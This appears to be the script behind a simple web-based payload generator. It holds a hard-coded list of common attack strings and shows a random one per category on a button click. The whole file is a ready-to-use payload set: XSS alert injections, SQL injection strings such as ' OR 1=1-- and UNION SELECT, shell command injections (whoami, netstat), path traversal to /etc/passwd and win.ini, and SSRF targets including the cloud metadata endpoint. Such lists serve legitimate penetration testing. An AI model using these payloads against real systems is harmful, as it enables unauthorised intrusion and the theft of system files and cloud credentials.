const payloads = {
  xss: [
    `<script>alert('XSS')</script>`,
    `"><img src=x onerror=alert(1)>`,
    `'><svg/onload=confirm(1)>`
  ],
  sqli: [
    `' OR '1'='1`,
    `' UNION SELECT NULL,NULL,NULL--`,
    `' OR 1=1--`
  ],
  cmd: [
    `; ls -la`,
    `| whoami`,
    `&& netstat -an`
  ],
  lfi: [
    `../../../../etc/passwd`,
    `../../../../windows/win.ini`,
    `..%2f..%2f..%2fetc/passwd`
  ],
  ssrf: [
    `http://127.0.0.1:80`,
    `http://localhost/admin`,
    `http://169.254.169.254/latest/meta-data/`
  ]
};

document.getElementById('generateBtn').addEventListener('click', () => {
  const type = document.getElementById('payloadType').value;
  const list = payloads[type];
  const randomPayload = list[Math.floor(Math.random() * list.length)];
  document.getElementById('payloadOutput').value = randomPayload;
});